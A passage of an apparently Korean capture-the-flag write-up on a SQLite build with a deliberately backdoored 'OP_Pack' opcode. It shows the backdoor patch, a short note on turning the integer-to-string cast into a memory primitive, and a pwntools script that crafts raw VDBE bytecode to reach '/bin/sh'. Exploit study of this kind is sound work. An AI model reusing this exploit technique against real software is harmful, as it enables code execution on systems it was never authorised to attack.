+</span></span><span style="display:flex;"><span><span style="color:#f92672">+++</span> sqlite<span style="color:#f92672">/</span>src<span style="color:#f92672">/</span>vdbe.c	<span style="color:#ae81ff">2024</span><span style="color:#f92672">-</span><span style="color:#ae81ff">12</span><span style="color:#f92672">-</span><span style="color:#ae81ff">12</span> <span style="color:#ae81ff">06</span><span style="color:#f92672">:</span><span style="color:#ae81ff">07</span><span style="color:#f92672">:</span><span style="color:#ae81ff">20.514797634</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">0000</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">9039</span>,<span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">9039</span>,<span style="color:#ae81ff">24</span> <span style="color:#960050;background-color:#1e0010">@@</span>
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span> <span style="color:#75715e">#endif
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">/* Opcode: Pack P1 P2 * * *
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">+** Synopsis: r[P2] = p64(r[p1])
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">+**
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">+** Pack p64 integer to a string. A Christmas present for you.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">+*/</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">case</span> OP_Pack: {
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>  pIn1 <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>aMem[pOp<span style="color:#f92672">-&gt;</span>p1];
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>  pOut <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>aMem[pOp<span style="color:#f92672">-&gt;</span>p2];
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>  pOut<span style="color:#f92672">-&gt;</span>flags <span style="color:#f92672">=</span> MEM_Str<span style="color:#f92672">|</span>MEM_Static<span style="color:#f92672">|</span>MEM_Term;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>  i64 <span style="color:#f92672">*</span>buf <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#66d9ef">sizeof</span>(i64));
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>  <span style="color:#f92672">*</span>buf <span style="color:#f92672">=</span> pIn1<span style="color:#f92672">-&gt;</span>u.i;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>  pOut<span style="color:#f92672">-&gt;</span>z <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)buf;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>  pOut<span style="color:#f92672">-&gt;</span>n <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>  pOut<span style="color:#f92672">-&gt;</span>enc <span style="color:#f92672">=</span> encoding;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>  <span style="color:#a6e22e">UPDATE_MAX_BLOBSIZE</span>(pOut);
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>  <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>}
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span> <span style="color:#75715e">/* Opcode: Noop * * * * *
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> **
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> ** Do nothing.  Continue downward to the next opcode.
+</span></span></span></code></pre></div><p>백도어 기능 추가해준다.<br>
+string으로 인식시켜준다.</p>
+<h2 id="exploit">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h2>
+<p><a href="https://github.com/sqlite/sqlite/blob/master/src/vdbe.c">https://github.com/sqlite/sqlite/blob/master/src/vdbe.c</a><br>
+<a href="https://github.com/sqlite/sqlite/blob/master/src/vdbemem.c">https://github.com/sqlite/sqlite/blob/master/src/vdbemem.c</a><br>
+이거 두개 열심히 읽고 익스했다.<br>
+str, blob 같은 애들이랑 long, int랑은 실제 데이터 저장하는 구조가 다르고, 바이트코드에서 raw하게 포인터를 p4로 넘겨받아서 처리한다.<br>
+근데 int, long을 str로 캐스팅하는 백도어 명령을 넣어줬으니 알잘딱해서 고민하다보면, 0x38 align을 깨고 raw하게 메모리에 구조체를 만들 수 있는 primitive를 만들 수 있게 된다.<br>
+그리고 바이트 코드 한번 넣으면 끝이니 원큐에 익스를 성공해야한다.</p>
+<p>원래 Sqlite3 단에서 바이트코드 컴파일할때 p4에 builtin 함수들 객체 넘겨줘서 여러 함수 호출 가능한거라 leak하고 코드 실행을 어케할건지 생각을 해봐야한다.<br>
+잘 생각해보면 메모리를 다 갖고 놀 수 있으면 런타임에 자기가 leak하고 자기 자신 코드를 패치하면 된다.</p>
+<p>구조체 만드는 primitive를 위해서 다음 기능을 쓰면 된다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">case</span> OP_Concat: {           <span style="color:#75715e">/* same as TK_CONCAT, in1, in2, out3 */</span>
+</span></span><span style="display:flex;"><span>  i64 nByte;          <span style="color:#75715e">/* Total size of the output string or blob */</span>
+</span></span><span style="display:flex;"><span>  u16 flags1;         <span style="color:#75715e">/* Initial flags for P1 */</span>
+</span></span><span style="display:flex;"><span>  u16 flags2;         <span style="color:#75715e">/* Initial flags for P2 */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  pIn1 <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>aMem[pOp<span style="color:#f92672">-&gt;</span>p1];
+</span></span><span style="display:flex;"><span>  pIn2 <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>aMem[pOp<span style="color:#f92672">-&gt;</span>p2];
+</span></span><span style="display:flex;"><span>  pOut <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>aMem[pOp<span style="color:#f92672">-&gt;</span>p3];
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">testcase</span>( pOut<span style="color:#f92672">==</span>pIn2 );
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">assert</span>( pIn1<span style="color:#f92672">!=</span>pOut );
+</span></span><span style="display:flex;"><span>  flags1 <span style="color:#f92672">=</span> pIn1<span style="color:#f92672">-&gt;</span>flags;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">testcase</span>( flags1 <span style="color:#f92672">&amp;</span> MEM_Null );
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">testcase</span>( pIn2<span style="color:#f92672">-&gt;</span>flags <span style="color:#f92672">&amp;</span> MEM_Null );
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>( (flags1 <span style="color:#f92672">|</span> pIn2<span style="color:#f92672">-&gt;</span>flags) <span style="color:#f92672">&amp;</span> MEM_Null ){
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sqlite3VdbeMemSetNull</span>(pOut);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>( (flags1 <span style="color:#f92672">&amp;</span> (MEM_Str<span style="color:#f92672">|</span>MEM_Blob))<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span> ){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>( <span style="color:#a6e22e">sqlite3VdbeMemStringify</span>(pIn1,encoding,<span style="color:#ae81ff">0</span>) ) <span style="color:#66d9ef">goto</span> no_mem;
+</span></span><span style="display:flex;"><span>    flags1 <span style="color:#f92672">=</span> pIn1<span style="color:#f92672">-&gt;</span>flags <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span>MEM_Str;
+</span></span><span style="display:flex;"><span>  }<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>( (flags1 <span style="color:#f92672">&amp;</span> MEM_Zero)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span> ){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>( <span style="color:#a6e22e">sqlite3VdbeMemExpandBlob</span>(pIn1) ) <span style="color:#66d9ef">goto</span> no_mem;
+</span></span><span style="display:flex;"><span>    flags1 <span style="color:#f92672">=</span> pIn1<span style="color:#f92672">-&gt;</span>flags <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span>MEM_Str;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  flags2 <span style="color:#f92672">=</span> pIn2<span style="color:#f92672">-&gt;</span>flags;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>( (flags2 <span style="color:#f92672">&amp;</span> (MEM_Str<span style="color:#f92672">|</span>MEM_Blob))<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span> ){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>( <span style="color:#a6e22e">sqlite3VdbeMemStringify</span>(pIn2,encoding,<span style="color:#ae81ff">0</span>) ) <span style="color:#66d9ef">goto</span> no_mem;
+</span></span><span style="display:flex;"><span>    flags2 <span style="color:#f92672">=</span> pIn2<span style="color:#f92672">-&gt;</span>flags <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span>MEM_Str;
+</span></span><span style="display:flex;"><span>  }<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>( (flags2 <span style="color:#f92672">&amp;</span> MEM_Zero)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span> ){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>( <span style="color:#a6e22e">sqlite3VdbeMemExpandBlob</span>(pIn2) ) <span style="color:#66d9ef">goto</span> no_mem;
+</span></span><span style="display:flex;"><span>    flags2 <span style="color:#f92672">=</span> pIn2<span style="color:#f92672">-&gt;</span>flags <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span>MEM_Str;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  nByte <span style="color:#f92672">=</span> pIn1<span style="color:#f92672">-&gt;</span>n <span style="color:#f92672">+</span> pIn2<span style="color:#f92672">-&gt;</span>n;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>( nByte<span style="color:#f92672">&gt;</span>db<span style="color:#f92672">-&gt;</span>aLimit[SQLITE_LIMIT_LENGTH] ){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">goto</span> too_big;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>( <span style="color:#a6e22e">sqlite3VdbeMemGrow</span>(pOut, (<span style="color:#66d9ef">int</span>)nByte<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>, pOut<span style="color:#f92672">==</span>pIn2) ){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">goto</span> no_mem;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">MemSetTypeFlag</span>(pOut, MEM_Str);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>( pOut<span style="color:#f92672">!=</span>pIn2 ){
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(pOut<span style="color:#f92672">-&gt;</span>z, pIn2<span style="color:#f92672">-&gt;</span>z, pIn2<span style="color:#f92672">-&gt;</span>n);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">assert</span>( (pIn2<span style="color:#f92672">-&gt;</span>flags <span style="color:#f92672">&amp;</span> MEM_Dyn) <span style="color:#f92672">==</span> (flags2 <span style="color:#f92672">&amp;</span> MEM_Dyn) );
+</span></span><span style="display:flex;"><span>    pIn2<span style="color:#f92672">-&gt;</span>flags <span style="color:#f92672">=</span> flags2;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(<span style="color:#f92672">&amp;</span>pOut<span style="color:#f92672">-&gt;</span>z[pIn2<span style="color:#f92672">-&gt;</span>n], pIn1<span style="color:#f92672">-&gt;</span>z, pIn1<span style="color:#f92672">-&gt;</span>n);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">assert</span>( (pIn1<span style="color:#f92672">-&gt;</span>flags <span style="color:#f92672">&amp;</span> MEM_Dyn) <span style="color:#f92672">==</span> (flags1 <span style="color:#f92672">&amp;</span> MEM_Dyn) );
+</span></span><span style="display:flex;"><span>  pIn1<span style="color:#f92672">-&gt;</span>flags <span style="color:#f92672">=</span> flags1;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>( encoding<span style="color:#f92672">&gt;</span>SQLITE_UTF8 ) nByte <span style="color:#f92672">&amp;=</span> <span style="color:#f92672">~</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  pOut<span style="color:#f92672">-&gt;</span>z[nByte]<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  pOut<span style="color:#f92672">-&gt;</span>z[nByte<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  pOut<span style="color:#f92672">-&gt;</span>flags <span style="color:#f92672">|=</span> MEM_Term;
+</span></span><span style="display:flex;"><span>  pOut<span style="color:#f92672">-&gt;</span>n <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>)nByte;
+</span></span><span style="display:flex;"><span>  pOut<span style="color:#f92672">-&gt;</span>enc <span style="color:#f92672">=</span> encoding;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">UPDATE_MAX_BLOBSIZE</span>(pOut);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>오랜만에 해서 그런지 재밌게 풀었다.</p>
+<h3 id="exploit-script">Exploit script<a hidden class="anchor" aria-hidden="true" href="#exploit-script">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>OP_Init          <span style="color:#f92672">=</span>  <span style="color:#ae81ff">8</span><span style="color:#75715e"># /* jump, synopsis: Start at P2                */</span>
+</span></span><span style="display:flex;"><span>OP_PureFunc      <span style="color:#f92672">=</span> <span style="color:#ae81ff">65</span><span style="color:#75715e"># /* synopsis: r[P3]=func(r[P2@NP])             */</span>
+</span></span><span style="display:flex;"><span>OP_Function      <span style="color:#f92672">=</span> <span style="color:#ae81ff">66</span><span style="color:#75715e"># /* synopsis: r[P3]=func(r[P2@NP])             */</span>
+</span></span><span style="display:flex;"><span>OP_Halt          <span style="color:#f92672">=</span> <span style="color:#ae81ff">70</span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span>OP_Integer       <span style="color:#f92672">=</span> <span style="color:#ae81ff">71</span><span style="color:#75715e"># /* synopsis: r[P2]=P1                         */</span>
+</span></span><span style="display:flex;"><span>OP_Int64         <span style="color:#f92672">=</span> <span style="color:#ae81ff">72</span><span style="color:#75715e"># /* synopsis: r[P2]=P4                         */</span>
+</span></span><span style="display:flex;"><span>OP_Blob          <span style="color:#f92672">=</span> <span style="color:#ae81ff">77</span><span style="color:#75715e"># /* synopsis: r[P2]=P4 (len=P1)                */</span>
+</span></span><span style="display:flex;"><span>OP_IntCopy       <span style="color:#f92672">=</span> <span style="color:#ae81ff">82</span><span style="color:#75715e"># /* synopsis: r[P2]=r[P1]                      */</span>
+</span></span><span style="display:flex;"><span>OP_AddImm        <span style="color:#f92672">=</span> <span style="color:#ae81ff">86</span><span style="color:#75715e"># /* synopsis: r[P1]=r[P1]+P2                   */</span>
+</span></span><span style="display:flex;"><span>OP_Noop          <span style="color:#f92672">=</span><span style="color:#ae81ff">185</span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span>OP_Pack          <span style="color:#f92672">=</span><span style="color:#ae81ff">187</span><span style="color:#75715e"># backdoored one</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OPFLG_JUMP       <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x01</span><span style="color:#75715e">#  /* jump:  P2 holds jmp target */</span>
+</span></span><span style="display:flex;"><span>OPFLG_IN1        <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x02</span><span style="color:#75715e">#  /* in1:   P1 is an input */</span>
+</span></span><span style="display:flex;"><span>OPFLG_IN2        <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x04</span><span style="color:#75715e">#  /* in2:   P2 is an input */</span>
+</span></span><span style="display:flex;"><span>OPFLG_IN3        <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08</span><span style="color:#75715e">#  /* in3:   P3 is an input */</span>
+</span></span><span style="display:flex;"><span>OPFLG_OUT2       <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x10</span><span style="color:#75715e">#  /* out2:  P2 is an output */</span>
+</span></span><span style="display:flex;"><span>OPFLG_OUT3       <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x20</span><span style="color:#75715e">#  /* out3:  P3 is an output */</span>
+</span></span><span style="display:flex;"><span>OPFLG_NCYCLE     <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40</span><span style="color:#75715e">#  /* ncycle:Cycles count against P1 */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OPSZ<span style="color:#f92672">=</span><span style="color:#ae81ff">24</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gen</span>(opcode, p1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, p2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> , p3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ,p4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ,p4_type <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, p5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>):
+</span></span><span style="display:flex;"><span>  payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>  payload <span style="color:#f92672">+=</span> p8(opcode)
+</span></span><span style="display:flex;"><span>  payload <span style="color:#f92672">+=</span> p8(p4_type)
+</span></span><span style="display:flex;"><span>  payload <span style="color:#f92672">+=</span> p16(p5)
+</span></span><span style="display:flex;"><span>  payload <span style="color:#f92672">+=</span> p32(p1)
+</span></span><span style="display:flex;"><span>  payload <span style="color:#f92672">+=</span> p32(p2)
+</span></span><span style="display:flex;"><span>  payload <span style="color:#f92672">+=</span> p32(p3)
+</span></span><span style="display:flex;"><span>  payload <span style="color:#f92672">+=</span> p64(p4)
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> payload
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># https://files.openstack.org/mirror/ubuntu/pool/main/g/glibc/</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># p = process([&#39;./out.bin&#39;], env={&#34;LD_LIBRARY_PATH&#34;:&#34;.&#34;})</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># context.log_level=&#39;debug&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># p = remote(&#39;34.146.186.1&#39;, 21002)</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;localhost&#39;</span>, <span style="color:#ae81ff">4444</span>)
+</span></span><span style="display:flex;"><span>sla <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x,y : p<span style="color:#f92672">.</span>sendlineafter(x,y)
+</span></span><span style="display:flex;"><span>sa <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x,y : p<span style="color:#f92672">.</span>sendafter(x,y)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>MAP_ADDR <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2000000000</span>
+</span></span><span style="display:flex;"><span>DATA_ADDR <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span> <span style="color:#f92672">+</span> MAP_ADDR
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>code <span style="color:#f92672">=</span> gen(OP_Init, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>) <span style="color:#75715e"># jmp to pc</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>L<span style="color:#f92672">=</span><span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>D<span style="color:#f92672">=</span><span style="color:#ae81ff">19</span>
+</span></span><span style="display:flex;"><span>DST <span style="color:#f92672">=</span> <span style="color:#ae81ff">18</span>
+</span></span><span style="display:flex;"><span>one <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000000984cf</span> 
+</span></span><span style="display:flex;"><span>code <span style="color:#f92672">+=</span> gen(OP_IntCopy, (<span style="color:#f92672">-</span><span style="color:#ae81ff">627</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffffffff</span>, L) 
+</span></span><span style="display:flex;"><span>code <span style="color:#f92672">+=</span> gen(OP_AddImm, L, (<span style="color:#f92672">-</span><span style="color:#ae81ff">0x181b0</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x212000</span> <span style="color:#f92672">+</span> one)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffffffff</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>code <span style="color:#f92672">+=</span> gen(OP_Blob, p1<span style="color:#f92672">=</span><span style="color:#ae81ff">0x0</span>, p2<span style="color:#f92672">=</span>DST, p4<span style="color:#f92672">=</span>DATA_ADDR) <span style="color:#75715e"># load blob p1 sz, p2 idx</span>
+</span></span><span style="display:flex;"><span>code <span style="color:#f92672">+=</span> gen(OP_IntCopy, (<span style="color:#f92672">-</span><span style="color:#ae81ff">37</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffffffff</span>, D) 
+</span></span><span style="display:flex;"><span>code <span style="color:#f92672">+=</span> gen(OP_AddImm, D, <span style="color:#ae81ff">0x1cf7</span>) 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">imm64</span>(offset, target):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> target <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> gen(OP_Blob, p1<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>, p2<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>, p4<span style="color:#f92672">=</span>DATA_ADDR <span style="color:#f92672">+</span> offset) <span style="color:#75715e"># load blob p1 sz, p2 idx</span>
+</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> gen(<span style="color:#ae81ff">112</span>, p2<span style="color:#f92672">=</span>target, p1<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>, p3<span style="color:#f92672">=</span>target)  <span style="color:#75715e"># concat p2 + p1 = p3(out) OP_CONCAT, not 111</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> code
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">immX</span>(offset, target, x):
+</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> gen(OP_Blob, p1<span style="color:#f92672">=</span>x, p2<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>, p4<span style="color:#f92672">=</span>DATA_ADDR <span style="color:#f92672">+</span> offset) <span style="color:#75715e"># load blob p1 sz, p2 idx</span>
+</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> gen(<span style="color:#ae81ff">112</span>, p2<span style="color:#f92672">=</span>target, p1<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>, p3<span style="color:#f92672">=</span>target)  <span style="color:#75715e"># concat p2 + p1 = p3(out) OP_CONCAT</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> code
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pack64</span>(r, target):
+</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> gen(OP_Pack, p1<span style="color:#f92672">=</span>r, p2<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> gen(<span style="color:#ae81ff">112</span>, p2<span style="color:#f92672">=</span>target, p1<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>, p3<span style="color:#f92672">=</span>target)  <span style="color:#75715e"># concat p2 + p1 = p3(out) OP_CONCAT</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> code
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>code <span style="color:#f92672">+=</span> imm64(<span style="color:#ae81ff">0</span>, DST)
+</span></span><span style="display:flex;"><span>code <span style="color:#f92672">+=</span> gen(OP_AddImm, D, <span style="color:#ae81ff">8</span>) 
+</span></span><span style="display:flex;"><span>code <span style="color:#f92672">+=</span> pack64(D, DST)
+</span></span><span style="display:flex;"><span>code <span style="color:#f92672">+=</span> gen(OP_AddImm, D, (<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffffffff</span>)
+</span></span><span style="display:flex;"><span>code <span style="color:#f92672">+=</span> immX(<span style="color:#ae81ff">16</span>, DST, <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>code <span style="color:#f92672">+=</span> pack64(L, DST)
+</span></span><span style="display:flex;"><span>code <span style="color:#f92672">+=</span> immX(<span style="color:#ae81ff">32</span>, DST, <span style="color:#ae81ff">0x360</span>) 
+</span></span><span style="display:flex;"><span>code <span style="color:#f92672">+=</span> gen(OP_AddImm, L, (<span style="color:#ae81ff">0x58740</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x1b</span><span style="color:#f92672">-</span>one)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffffffff</span>)
+</span></span><span style="display:flex;"><span>code <span style="color:#f92672">+=</span> pack64(L, DST)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>code <span style="color:#f92672">+=</span> gen(OP_IntCopy, D, <span style="color:#ae81ff">1834</span>) <span style="color:#75715e"># p4 add</span>
+</span></span><span style="display:flex;"><span>code <span style="color:#f92672">+=</span> gen(OP_Noop, p3<span style="color:#f92672">=</span><span style="color:#ae81ff">0x43</span>,p2<span style="color:#f92672">=</span><span style="color:#ae81ff">0x43</span>,p1<span style="color:#f92672">=</span><span style="color:#ae81ff">0x43</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>code <span style="color:#f92672">+=</span> gen(OP_PureFunc, p4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>, p3<span style="color:#f92672">=</span><span style="color:#ae81ff">0x43</span>,p2<span style="color:#f92672">=</span><span style="color:#ae81ff">0x43</span>,p1<span style="color:#f92672">=</span><span style="color:#ae81ff">0x43</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>code <span style="color:#f92672">+=</span> gen(OP_Halt)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> len(code) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x1000</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> code
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xff</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x1000</span> <span style="color:#f92672">-</span> len(code))
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#75715e"># Mem * pOut</span>
